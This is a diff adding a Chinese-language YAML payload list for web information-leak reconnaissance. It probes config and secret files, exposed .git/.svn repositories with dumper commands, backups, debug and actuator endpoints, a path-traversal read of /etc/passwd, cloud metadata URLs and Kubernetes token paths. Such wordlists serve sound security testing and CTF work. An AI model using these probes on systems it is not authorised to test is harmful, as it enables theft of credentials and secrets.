@@ -1,0 +1,290 @@
+# 信息泄露 Payload 知识库
+# 来源: Des-CTF-Knowledge + Hunter 实战经验
+# 更新: 2026-06-02
+
+metadata:
+  category: info_leak
+  description: "信息泄露 Payload 集合"
+  version: "1.0"
+
+# ============================================
+# 1. 路径泄露
+# ============================================
+path_disclosure:
+  description: "路径信息泄露"
+  php_errors:
+    - "/index.php"
+    - "/index.php?page=../../../../etc/passwd"
+    - "/index.php?id='"
+    - "/index.php?page=nonexistent"
+  java_errors:
+    - "/actuator"
+    - "/actuator/env"
+    - "/actuator/health"
+    - "/actuator/info"
+    - "/actuator/mappings"
+    - "/actuator/trace"
+  asp_errors:
+    - "/web.config"
+    - "/global.asax"
+  nginx_errors:
+    - "/nginx_status"
+    - "/server-status"
+
+# ============================================
+# 2. 配置文件泄露
+# ============================================
+config_files:
+  description: "配置文件泄露"
+  php:
+    - "/.env"
+    - "/config.php"
+    - "/config/database.php"
+    - "/config/app.php"
+    - "/wp-config.php"
+    - "/configuration.php"
+    - "/settings.php"
+    - "/includes/config.php"
+    - "/application/config/database.php"
+  java:
+    - "/application.properties"
+    - "/application.yml"
+    - "/application.yaml"
+    - "/bootstrap.properties"
+    - "/bootstrap.yml"
+    - "/config/application.properties"
+    - "/WEB-INF/web.xml"
+    - "/META-INF/MANIFEST.MF"
+  python:
+    - "/settings.py"
+    - "/config.py"
+    - "/.env"
+    - "/config.ini"
+    - "/local_settings.py"
+  node:
+    - "/.env"
+    - "/config.json"
+    - "/config/default.json"
+    - "/config/production.json"
+    - "/.npmrc"
+    - "/.yarnrc"
+  ruby:
+    - "/config/database.yml"
+    - "/config/secrets.yml"
+    - "/config/application.yml"
+    - "/.env"
+
+# ============================================
+# 3. 版本信息泄露
+# ============================================
+version_disclosure:
+  description: "版本信息泄露"
+  headers:
+    - "Server"
+    - "X-Powered-By"
+    - "X-AspNet-Version"
+    - "X-AspNetMvc-Version"
+    - "X-Runtime"
+    - "X-Version"
+  pages:
+    - "/README.md"
+    - "/CHANGELOG.md"
+    - "/LICENSE"
+    - "/package.json"
+    - "/composer.json"
+    - "/Gemfile"
+    - "/requirements.txt"
+    - "/pom.xml"
+    - "/build.gradle"
+    - "/Cargo.toml"
+    - "/go.mod"
+
+# ============================================
+# 4. Git 信息泄露
+# ============================================
+git_disclosure:
+  description: "Git 信息泄露"
+  paths:
+    - "/.git/config"
+    - "/.git/HEAD"
+    - "/.git/index"
+    - "/.git/logs/HEAD"
+    - "/.git/refs/heads/master"
+    - "/.git/refs/heads/main"
+    - "/.gitignore"
+  tools:
+    - name: "git-dumper"
+      command: "git-dumper http://target/.git/ output"
+    - name: "dvcs-ripper"
+      command: "perl rip-git.pl -v -u http://target/.git/"
+    - name: "GitTools"
+      command: "./Dumper/gitdumper.sh http://target/.git/ output"
+
+# ============================================
+# 5. SVN 信息泄露
+# ============================================
+svn_disclosure:
+  description: "SVN 信息泄露"
+  paths:
+    - "/.svn/entries"
+    - "/.svn/wc.db"
+    - "/.svn/pristine/"
+    - "/.svn/format"
+  tools:
+    - name: "svn-extractor"
+      command: "python svn-extractor.py --url http://target/"
+
+# ============================================
+# 6. DS_Store 信息泄露
+# ============================================
+ds_store:
+  description: ".DS_Store 文件泄露"
+  paths:
+    - "/.DS_Store"
+  tools:
+    - name: "ds_store_exp"
+      command: "python ds_store_exp.py http://target/.DS_Store"
+
+# ============================================
+# 7. SWAP 文件泄露
+# ============================================
+swap_files:
+  description: "SWAP 文件泄露"
+  paths:
+    - "/.index.php.swp"
+    - "/.index.php.swo"
+    - "/.index.php.swx"
+    - "/.config.php.swp"
+    - "/.wp-config.php.swp"
+
+# ============================================
+# 8. 备份文件泄露
+# ============================================
+backup_files:
+  description: "备份文件泄露"
+  common:
+    - "/backup.zip"
+    - "/backup.tar.gz"
+    - "/backup.rar"
+    - "/www.zip"
+    - "/www.tar.gz"
+    - "/web.zip"
+    - "/web.tar.gz"
+    - "/site.zip"
+    - "/site.tar.gz"
+    - "/database.sql"
+    - "/dump.sql"
+    - "/db.sql"
+    - "/backup.sql"
+    - "/1.sql"
+    - "/data.sql"
+  php:
+    - "/index.php.bak"
+    - "/index.php~"
+    - "/index.php.old"
+    - "/index.php.orig"
+    - "/index.php.save"
+    - "/index.php.swp"
+    - "/index.php.txt"
+  config:
+    - "/config.php.bak"
+    - "/config.php~"
+    - "/config.php.old"
+    - "/config.php.save"
+    - "/config.php.swp"
+    - "/config.php.txt"
+
+# ============================================
+# 9. 调试信息泄露
+# ============================================
+debug_info:
+  description: "调试信息泄露"
+  php:
+    - "/phpinfo.php"
+    - "/info.php"
+    - "/test.php"
+    - "/i.php"
+    - "/p.php"
+  python:
+    - "/debug"
+    - "/_debug"
+    - "/debug/vars"
+    - "/debug/requests"
+  ruby:
+    - "/__better_errors/"
+  node:
+    - "/debug"
+    - "/status"
+
+# ============================================
+# 10. API 文档泄露
+# ============================================
+api_docs:
+  description: "API 文档泄露"
+  swagger:
+    - "/swagger-ui.html"
+    - "/swagger-ui/"
+    - "/swagger.json"
+    - "/swagger.yaml"
+    - "/api-docs"
+    - "/v2/api-docs"
+    - "/v3/api-docs"
+  graphql:
+    - "/graphql"
+    - "/graphiql"
+    - "/graphql/console"
+  wadl:
+    - "/application.wadl"
+  wsdl:
+    - "/service?wsdl"
+    - "/services?wsdl"
+
+# ============================================
+# 11. 监控接口泄露
+# ============================================
+monitoring:
+  description: "监控接口泄露"
+  spring_actuator:
+    - "/actuator"
+    - "/actuator/env"
+    - "/actuator/health"
+    - "/actuator/info"
+    - "/actuator/mappings"
+    - "/actuator/trace"
+    - "/actuator/beans"
+    - "/actuator/configprops"
+    - "/actuator/heapdump"
+    - "/actuator/threaddump"
+    - "/actuator/metrics"
+    - "/actuator/loggers"
+    - "/actuator/flyway"
+    - "/actuator/liquibase"
+    - "/actuator/jolokia"
+  prometheus:
+    - "/metrics"
+    - "/prometheus"
+  grafana:
+    - "/grafana"
+    - "/grafana/login"
+  kibana:
+    - "/kibana"
+    - "/kibana/app/kibana"
+
+# ============================================
+# 12. 内网信息泄露
+# ============================================
+internal_info:
+  description: "内网信息泄露"
+  aws:
+    - "http://169.254.169.254/latest/meta-data/"
+    - "http://169.254.169.254/latest/user-data/"
+  gcp:
+    - "http://metadata.google.internal/computeMetadata/v1/"
+  aliyun:
+    - "http://100.100.100.200/latest/meta-data/"
+  docker:
+    - "/.dockerenv"
+    - "/proc/1/cgroup"
+  kubernetes:
+    - "/var/run/secrets/kubernetes.io/serviceaccount/token"
+    - "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
